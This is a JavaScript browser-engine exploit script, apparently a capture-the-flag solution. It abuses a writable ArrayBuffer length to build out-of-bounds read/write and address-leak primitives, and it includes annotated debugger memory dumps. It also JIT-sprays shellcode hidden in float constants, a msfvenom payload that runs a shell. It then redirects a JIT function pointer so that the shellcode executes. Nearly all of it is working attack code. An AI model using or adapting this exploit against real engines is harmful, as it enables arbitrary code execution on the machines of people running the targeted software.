function dump(badBuf, size) {
  for (let i = 0; i < size; i++) {
    console.log(`${i}: ${badBuf[i].toString(16)}`)
  }
}

var abuf = new ArrayBuffer(10);
abuf.byteLength = 1000;
abuf = new BigUint64Array(abuf);
abuf[0] = 0x4141414141414141n; // tag to find in debugging
/*
gef➤  grep 0x4141414141414141
  - 0x58dcd46a0c8
gef➤  x/40xg 0x58dcd46a0c8-0x40
0x58dcd46a088:    0x0000000000000000                  0x0000058dcd466700 (*shape)
0x58dcd46a098:    0x00005618d8518088 (*slots)         0x00005618d8517828 (*elementsHdr)
0x58dcd46a0a8:    0x0000058dcd46a0c8 (*elementsData)  0x00000000000003e8 (byteLength)
0x58dcd46a0b8:    0xfffe3ee4bd6007a0 (*typedArray)    0xfff8800000000000 (offset)
0x58dcd46a0c8:    0x4141414141414141 (data start)     0x0000000000000000 
0x58dcd46a0d8:    0x0000000000000000                  0x0000000000000000  
0x58dcd46a0e8:    0x0000000000000000                  0x0000000000000000  
0x58dcd46a0f8:    0x0000000000000000                  0x0000000000000000  
0x58dcd46a108:    0x0000000000000000                  0x0000000000000000 (data end)
*/

var bbuf = new ArrayBuffer(10);
bbuf.byteLength = 1000;
bbufType = new BigUint64Array(bbuf);
bbufType[0] = 0x4242424242424242n; // tag to find in debugging
/*
objectAddress(bbuf) == 0x3d5335066088
gef➤  x/40gx 0x3d5335066088
0x3d5335066088:	0x00003d5335062f00	0x00007f538f83efc8 < slots
0x3d5335066098:	0x0000560c782a5f58	0x00003d53350641a0 < elementsData
0x3d53350660a8:	0x00000000000003e8	0xfffe064bd8200918
0x3d53350660b8:	0xfff8800000000000	0x4242424242424242
0x3d53350660c8:	0x0000000000000000	0x0000000000000000
*/

function read64(addr) {
  // write "addr" in bbuf->elementsData
  abuf[7] = addr;
  // create u64 array with bbuf->elementsData
  return new BigUint64Array(bbuf)[0];
}

function write64(addr, value) {
  // write "addr" in bbuf->elementsData
  abuf[7] = addr;
  // create u64 array with bbuf->elementsData and write to [0]
  new BigUint64Array(bbuf)[0] = value
}

function addrOf(obj_to_leak) {
  // put obj_to_leak in bbuf new prop
  bbuf.leak = obj_to_leak;
  // read "bbuf->slots" to get address
  var addr = read64(abuf[5]) & 0xffffffffffffn; // mask to pointer tagging
  return addr;
}

// https://vulndev.io/shellcode-converter/
function shellcode() {
  EGG = 5.40900888e-315;          // 0x41414141 in memory, marker to find
  C01 = -6.828527034422786e-229;  // 0x9090909090909090
// msfvenom -p linux/x64/exec CMD="/bin/sh -c 'id;bash'" -f byte
  C02 = 6.867659397734779e+246     
  C03 = 7.806615353364766e+184
  C04 = 2.541954188459429e-198
  C05 = 3.2060568060029287e-80
  C06 = 3.4574612453438036e+198
  C07 = 7.57500810708945e-119
  C08 = 1.0802257739008538e+117
  C09 = -6.828527034370483e-229    
}

// JIT shellcode
for (let i = 0; i < 100000; i++) {
  shellcode();
}

shellcode_addr = addrOf(shellcode);
while(shellcode_addr == addrOf(shellcode)){
    // just block until we get the updated addr 
}

// get JSFunction address
shellcode_addr = addrOf(shellcode);

// get jitInfo of JSFunction object (JSFunction.u.native.extra.jitInfo_)
jitinfo = read64(shellcode_addr + 0x28n);
// follow jitInfo address to found exec page 
rx_region = read64(jitinfo & 0xffffffffffffn);

// find shellcode in this memory
target = rx_region;
for (let i = 0; i < 0x800; i++) {
  data = read64(target);
  if (data == 0x41414141n) {
    target += 8n;
    break;
  }
  target += 8n;
}

// replace function pointer to shellcode
write64(jitinfo, target);
// call shellcode
shellcode()
